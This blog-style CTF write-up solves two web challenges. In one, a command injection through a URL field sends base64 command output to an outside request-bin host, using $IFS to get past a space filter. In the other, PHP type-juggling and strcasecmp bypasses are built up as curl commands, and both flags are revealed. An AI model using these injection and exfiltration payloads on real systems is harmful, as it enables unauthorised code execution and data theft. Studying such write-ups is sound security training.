---
title: Web Writeup Sagarmatha Hacktoberfest CTF
published: true
---


# AnonBlog

Challenge Description
>There is a place Anonymous blog, people say you cannot share link there because it's their policy. They say sharing link leads to many security issues, though I think it's just opposite based on their specific context(their new feature)

http://nicehellonice-env.eba-p2umpa4t.us-east-1.elasticbeanstalk.com

It was a site where we can add posts through /post.
Cross Site Scripting was possible. At first I thought we use an xss payload to grab the cookie of the admin but it seemed like xss was just a rabbithole.

Checking the robots.txt of the site we find /features.txt that says
```
Newly added feature: Special Hyper Linking!
 - Automatically converts links into a hyperlink.
 - Try setting any URL in the Content, and see it!!
 NOTE: For some dumb reason, link-sharing was not allowed since day 1.
    But due to requests from the users we made it available for it. But
    you still cannot share links, so this application clones the URL
    locally (using curlY "ree--quest-TOR")*, then returns it to you
    from the application itself.
----------
*pronounced "curly requester"
```
So in my head I thought it as of
`curl https://site`
being executed whenever http/https word is used. So next step was to get code execution.

At first I tried common bypasses like && || but since the output was not  being shown, I was not sure if the command was being executed.

So I thought of another approach to send command output to a url. I quickly setup a request bin url and crafted my payload using command substitution like

`http://requestbin.net/r/1bvgn5b1/?output=$(command|base64)`
So what this will look like 

```sh
curl http://requestbin.net/r/1bvgn5b1/?output=$(command|base64)
$(command|base64) get executed and base64 output would be appended to output =
curl http://requestbin.net/r/1bvgn5b1/?output=base64output
```

And through http://requestbin.net/r/1bvgn5b1?inspect I could view the requests being made to the site.

Now that we have command execution with proper output. It was time to find the flag. Actually  using space in command was blocked. So I had to use $IFS instead for every command that contains space.
For example: `$(ls -la)` became `$(ls$IFS-la)`.
I looked around and found a file named `zhululu_2e3817293fc275dbee74bd71ce6eb056_FLAG_4e4d6c332b6fe62a63afe56171fd3725.txt` which contained the flag.
Then I read the file using  `$(base64$IFS-w$IFS\0$IFS/zh*)`
```sh
Sidenote
There is \ before 0 because $IFS0 would simply escape 0 it is behaviour of $IFS to escape suffix if there is no use of symbols like -, | etc.
```

On the request bin inspect tab I recieve ```Q29uZ3JhdHMhISBZb3UgbWFkZSB0aWxsIHRoZSBmbGFnIPCfjokKCgpHcmFiIGl0LCBpdCdzIGJlbG93OgpoYWNrdG9iZXJmZXN0X2N0ZntzaGVsbF9rZWtfcmljZV9mYmY4NjE5ZmY3ZjE1NjEzOWNkYWY0ZDdlM2UwNmQ3NX0K```

Decoding the base64 we get 
```
Congrats!! You made till the flag 🎉
Grab it, it's below:
hacktoberfest_ctf{shell_kek_rice_fbf8619ff7f156139cdaf4d7e3e06d75}
```
```hacktoberfest_ctf{shell_kek_rice_fbf8619ff7f156139cdaf4d7e3e06d75}```






# WrestlePHP
Challenge Description
>Can you beat PHP?

>Here's something that could help you out
>7068702e30646179676f642e78797a

Hex Decoding 7068702e30646179676f642e78797a gives php.0daygod.xyz
On visiting the site we are greeted with source code of the chall php.

 ```php
 <?php

    if($_SERVER['HTTP_USER_AGENT'] != "Yes, I am a human."){
        die("You are a bot, mate!");
    } else echo "Nice! Now that we know you are a human, you can proceed further.\n\n";

    $flag = array("hacktoberfest_ctf{");
    if(apache_request_headers()["Sagarmatha-Hacktoberfest-CTF"] == "https://hacktober.tk/"){
        array_push($flag, "you");
    }
    
    if(isset($_GET['hello']) && $_GET['hello'] === "hi"){
        array_push($flag, "can't");
    }
    
    if($_GET['world'] != "0x10001" && strcasecmp($_GET['world'], "0x10001") == 0){
        array_push($flag, "see");
    }
    
    if(isset($_GET['nice']) && isset($_GET['ecin']))
        if($_GET['nice'] != $_GET['ecin']){
            if(sha1($_GET['nice']) == sha1($_GET['ecin'])){            
                array_push($flag, "what");
            }        
        }
    
    if($_POST['ctf'] == md5($_POST['ctf'])){
        array_push($flag, "this");
    }
    
    if(isset($_POST['parm']) && isset($_POST['mrap'])){
        if(md5($_POST['parm']) == md5($_POST['mrap'])){
            if($_POST['parm'] != $_POST['mrap']){
                array_push($flag, "contains!");
            }
        }
    }
    
    array_push($flag, "}");
    
    echo implode('', $flag);
    
?> 

```
So lets follow along the source and solve the puzzle.
```php
if($_SERVER['HTTP_USER_AGENT'] != "Yes, I am a human."){
       die("You are a bot, mate!");
   } else echo "Nice! Now that we know you are a human, you can proceed further.\n\n";
  ```
First things first we need set out user-agent to "Yes, I am a human."

`curl -A "Yes, I am a human." https://php.0daygod.xyz/`

```php
if(apache_request_headers()["Sagarmatha-Hacktoberfest-CTF"] == "https://hacktober.tk/"){
       array_push($flag, "you");
   }
  ```
  Now we need to add a header `Sagarmatha-Hacktoberfest-CTF` with value `https://hacktober.tk/`
  
  `curl -A "Yes, I am a human." https://php.0daygod.xyz/ -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/"`
  
  ```php
   if(isset($_GET['hello']) && $_GET['hello'] === "hi"){
       array_push($flag, "can't");
   }
   ```
   we need to add a get variable hello and set its value to hi
   
   `curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/"`
   
   ```php
   if($_GET['world'] != "0x10001" && strcasecmp($_GET['world'], "0x10001") == 0){
       array_push($flag, "see");
   }
   ```
   So here the flag part gets appended when get value of world is not equal to 0x10001 but also on the second part of if statement for it to be 0 world must be 0x10001
   Luckily there is a bug for strcmp , strcasecmp where we can pass [] to bypass the check.
   
   `curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/"`
   
    ```php 
    if(isset($_GET['nice']) && isset($_GET['ecin']))
       if($_GET['nice'] != $_GET['ecin']){
           if(sha1($_GET['nice']) == sha1($_GET['ecin'])){            
               array_push($flag, "what");
           }        
       }
       ```

Here we need to pass two `get` params `nice` and `ecin` with different values but their sha1 values should be same in order for flag to be appended.
We use use the type juggling vulnerability here and pass two different value of nice and ecin but the  beginning part of their sha1 should match containg 0e.
From this [list](https://raw.githubusercontent.com/spaze/hashes/master/sha1.md) I was able to find such two words.
So lets pass them

`curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha&nice=aaroZmOk&ecin=aaK1STfY" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/"`


Similarly 
```php
if($_POST['ctf'] == md5($_POST['ctf'])){
       array_push($flag, "this");
   }
```
Here we need find simlar value of ctf like in step above and pass it by POST
`md5(0e215962017) = 0e291242476940776845150308577824`

`curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha&nice=aaroZmOk&ecin=aaK1STfY" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/" --data "ctf=0e215962017"`


 ```php if(isset($_POST['parm']) && isset($_POST['mrap'])){
       if(md5($_POST['parm']) == md5($_POST['mrap'])){
           if($_POST['parm'] != $_POST['mrap']){
               array_push($flag, "contains!");
           }
       }
   }
   ```
Similarly for the last piece of code we find such two words `hello24343860700` and `hello24034989169` and pass those values to post params parm and mrap

`curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha&nice=aaroZmOk&ecin=aaK1STfY" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/" --data "ctf=0e215962017&parm=hello24343860700&mrap=hello24034989169"`

And thus the final one liner 
`curl -sA "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha&nice=aaroZmOk&ecin=aaK1STfY" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/" --data "ctf=0e215962017&parm=hello24343860700&mrap=hello24034989169"|grep -oE "Flag: hacktoberfest_ctf{.*}"`

Flag: hacktoberfest_ctf{3qu4l17y_1s_n07_1d3nt17y_hehe_1337_0xcafebabe_cafedead}



